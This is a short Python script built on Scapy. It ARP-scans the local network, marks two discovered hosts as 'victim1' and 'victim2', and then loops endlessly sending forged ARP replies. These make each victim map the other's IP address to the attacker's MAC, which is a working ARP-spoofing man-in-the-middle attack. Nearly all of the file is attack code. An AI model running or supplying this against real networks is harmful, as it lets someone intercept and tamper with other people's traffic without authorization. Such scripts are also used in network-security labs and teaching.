from scapy.all import *
from scapy.all import IP, Ether, ARP, ICMP

network_addr = conf.route.net

frame = Ether(dst="ff:ff:ff:ff:ff:ff")

arp_packet = frame/ARP(pdst=network_addr)

IP_MAC_responses, unans = srp(arp_packet, timeout=2)

MAC_on_network = []
IP_on_network = []

for i in range(len(IP_MAC_responses)):
    MAC_on_network.append(IP_MAC_responses[i][1].hwsrc) #to extract MAC
    IP_on_network.append(IP_MAC_responses[i][1].psrc) #to extract IP

victim1_IP = IP_on_network[1]
victim1_MAC = MAC_on_network[1]

victim2_IP = IP_on_network[2]
victim2_MAC = MAC_on_network[2]

atk_mac = get_if_hwaddr(conf.iface)

while True:
    spoof_arp_victim2 = Ether(src=atk_mac)/ARP(op=2, pdst=victim2_IP, hwdst=victim2_MAC, psrc=victim1_IP)
    send_spoof2 = sendp(spoof_arp_victim2)
    spoof_arp_victim1 = Ether(src=atk_mac)/ARP(op=2, pdst=victim1_IP, hwdst=victim1_MAC, psrc=victim2_IP)
    send_spoof1 = sendp(spoof_arp_victim1)